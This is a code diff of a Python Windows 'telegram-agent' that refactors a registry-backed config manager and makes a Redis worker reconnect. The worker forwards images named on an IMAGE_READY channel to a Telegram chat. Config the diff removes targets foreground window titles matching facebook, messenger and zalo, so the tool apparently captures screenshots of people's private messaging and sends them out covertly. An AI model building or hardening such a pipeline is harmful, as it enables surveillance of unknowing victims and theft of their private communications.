@@ -11,6 +11,7 @@ from dataclasses import dataclass
 import winreg
 from telegram.ext import Application, CommandHandler
 from logger import setup_logger
+from regman import ConfigManager # type: ignore
 
 if getattr(sys, 'frozen', False):
     base_path = Path(sys.executable).parent
@@ -19,12 +20,6 @@ else:
 
 dotenv.load_dotenv(base_path / ".env")
 
-LOG_DIR = os.path.join(os.getenv("APPDATA"), "Agent", "logs")
-
-log = setup_logger(
-    "telegram-agent",
-    os.path.join(LOG_DIR, "telegram-agent.log")
-)
 
 REDIS_URL = os.getenv("REDIS_CONNECTION", "redis://localhost:6379/0")
 TG_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -33,48 +28,18 @@ REG_PATH = r"Software\tBotAgent\v1"
 _last_send = 0.0
 _send_lock = threading.Lock()
 
+configmgr = ConfigManager(reg_path=REG_PATH, ttl=2.0)
+
+log = setup_logger(
+    "telegram-agent",
+    os.path.join(configmgr.get().output_dir, configmgr.get().log_tbot_path, "telegram-agent.log")
+)
+
 if not TG_TOKEN or not TG_CHAT_ID:
     log.error("Telegram bot token or chat ID not set in environment variables.")
     sys.exit(1)
 
 API = f"https://api.telegram.org/bot{TG_TOKEN}"
-
-
-
-@dataclass
-class RegistryConfig:
-    enabled: bool = True
-    interval_sec: int = 5
-    title_regex: str = r"(facebook|messenger|zalo)"
-    fg_poll_interval: float = 0.5
-
-
-class ConfigManager:
-    def __init__(self, delete_minutes=5, ttl=3):
-        self._lock = threading.Lock()
-        self._last_load = 0.0
-        self._ttl = ttl
-        self._delete_in_x_minutes = delete_minutes
-        self._max_minutes = 1440
-        self._send_interval_sec = 1.2
-        self._config = RegistryConfig()
-
-    def get(self) -> RegistryConfig:
-        with self._lock:
-            if time.time() - self._last_load > self._ttl:
-                self._config = self._read_registry()
-                self._last_load = time.time()
-            return self._config
-
-    def write_reg(self, key: str, value):
-        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) as reg_key:
-            if isinstance(value, bool):
-                winreg.SetValueEx(reg_key, key, 0, winreg.REG_DWORD, int(value))
-            elif isinstance(value, int):
-                winreg.SetValueEx(reg_key, key, 0, winreg.REG_DWORD, value)
-            else:
-                winreg.SetValueEx(reg_key, key, 0, winreg.REG_SZ, str(value))
-
 
 def send_photo(path: str, configmgr: ConfigManager ) -> None:
     global _last_send
@@ -232,7 +197,7 @@ async def reload_agent(update, context):
 
 async def last_log_agent(update, context):
     n = int(context.args[0]) if context.args else 20
-    log_file = os.path.join(LOG_DIR, "agent.log")
+    log_file = os.path.join(configmgr.get().output_dir, configmgr.get().log_agent_path, "agent.log")
 
     try:
         with open(log_file, "r", encoding="utf-8") as f:
@@ -243,7 +208,7 @@ async def last_log_agent(update, context):
 
 async def last_log_bot(update, context):
     n = int(context.args[0]) if context.args else 20
-    log_file = os.path.join(LOG_DIR, "telegram-agent.log")
+    log_file = os.path.join(configmgr.get().output_dir, configmgr.get().log_tbot_path, "telegram-agent.log")
 
     try:
         with open(log_file, "r", encoding="utf-8") as f:
@@ -286,19 +251,73 @@ def app_init(token, config_mgr: ConfigManager):
         last_log_bot
     ))
 
+    app.add_handler(CommandHandler(
+        "redis_status",
+        lambda u, c: check_redis_status()
+    ))
+
     return app
 
 def redis_worker(stop_evt, config_mgr: ConfigManager):
     log.info("Starting Redis worker thread")
-    r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
-    pubsub = r.pubsub()
-    pubsub.subscribe("IMAGE_READY")
-    log.info("Subscribed to Redis channel: IMAGE_READY")
-
-    try:
-        for msg in pubsub.listen():
-            if stop_evt.is_set():
-                break
+    
+    retry_delay = 1.0
+    max_retry_delay = 60.0
+    health_check_interval = 30.0
+    last_health_check = 0.0
+    
+    r = None
+    pubsub = None
+    
+    while not stop_evt.is_set():
+        try:
+            # Create Redis connection with keepalive settings
+            if r is None:
+                log.info("Connecting to Redis...")
+                r = redis.Redis.from_url(
+                    REDIS_URL, 
+                    decode_responses=True,
+                    socket_keepalive=True,
+                    socket_keepalive_options={
+                        1: 10,  # TCP_KEEPIDLE
+                        2: 10,  # TCP_KEEPINTVL
+                        3: 3    # TCP_KEEPCNT
+                    },
+                    health_check_interval=30,
+                    socket_connect_timeout=5,
+                    socket_timeout=5
+                )
+                
+                # Test connection
+                r.ping()
+                log.info("Redis connection established")
+                
+                # Subscribe to channel
+                pubsub = r.pubsub()
+                pubsub.subscribe("IMAGE_READY")
+                log.info("Subscribed to Redis channel: IMAGE_READY")
+                
+                # Reset retry delay on successful connection
+                retry_delay = 1.0
+                last_health_check = time.time()
+            
+            # Get message with timeout (non-blocking listen)
+            msg = pubsub.get_message(timeout=1.0)
+            
+            # Periodic health check
+            now = time.time()
+            if now - last_health_check > health_check_interval:
+                try:
+                    r.ping()
+                    last_health_check = now
+                    log.debug("Redis health check: OK")
+                except Exception as e:
+                    log.warning("Redis health check failed: %s. Reconnecting...", e)
+                    raise redis.ConnectionError("Health check failed")
+            
+            if msg is None:
+                continue
+                
             if msg["type"] != "message":
                 continue
 
@@ -309,16 +328,54 @@ def redis_worker(stop_evt, config_mgr: ConfigManager):
                 if not path or not os.path.isfile(path):
                     continue
 
-                send_photo(path,configmgr=config_mgr)
+                send_photo(path, configmgr=config_mgr)
                 log.info("Sent image: %s", path)
 
             except Exception as e:
-                log.error("Redis handler error: %s", e)
-    finally:
-        log.warning("Redis worker stopped")
-        pubsub.unsubscribe()
-        pubsub.close()
-        r.close()
+                log.error("Redis message handler error: %s", e)
+                
+        except (redis.ConnectionError, redis.TimeoutError, OSError) as e:
+            log.error("Redis connection error: %s. Retrying in %.1fs...", e, retry_delay)
+            
+            # Clean up existing connections
+            if pubsub:
+                try:
+                    pubsub.close()
+                except:
+                    pass
+                pubsub = None
+            
+            if r:
+                try:
+                    r.close()
+                except:
+                    pass
+                r = None
+            
+            # Wait before retry with exponential backoff
+            time.sleep(retry_delay)
+            retry_delay = min(retry_delay * 2, max_retry_delay)
+            
+        except Exception as e:
+            log.error("Unexpected error in Redis worker: %s", e, exc_info=True)
+            time.sleep(5)
+    
+    # Cleanup on shutdown
+    log.warning("Redis worker stopping...")
+    if pubsub:
+        try:
+            pubsub.unsubscribe()
+            pubsub.close()
+        except:
+            pass
+    
+    if r:
+        try:
+            r.close()
+        except:
+            pass
+    
+    log.info("Redis worker stopped")
 
 if __name__ == "__main__":
     config = ConfigManager()
